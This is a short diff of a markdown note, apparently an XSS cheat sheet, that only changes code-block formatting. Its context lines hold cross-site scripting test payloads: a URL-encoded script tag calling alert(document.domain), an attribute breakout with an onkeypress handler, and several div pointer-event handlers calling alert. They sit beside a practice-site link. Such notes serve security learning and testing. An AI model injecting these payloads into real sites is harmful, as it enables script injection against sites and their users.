@@ -300,7 +300,8 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 
 - Special characters: `' " < > / // ( ) ^ script img svg div alert prompt`
 - Event Handlers:
-  ```html
+
+```bash
   Hello" onkeypress="prompt(1)
 <div onpointerover="alert(45)">MOVE HERE</div>
 <div onpointerdown="alert(45)">MOVE HERE</div>
@@ -309,7 +310,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <div onpointermove="alert(45)">MOVE HERE</div>
 <div onpointerout="alert(45)">MOVE HERE</div>
 <div onpointerup="alert(45)">MOVE HERE</div>
-  ```
+```
 practise excercise: websites:
 
 https://prompt.ml/0
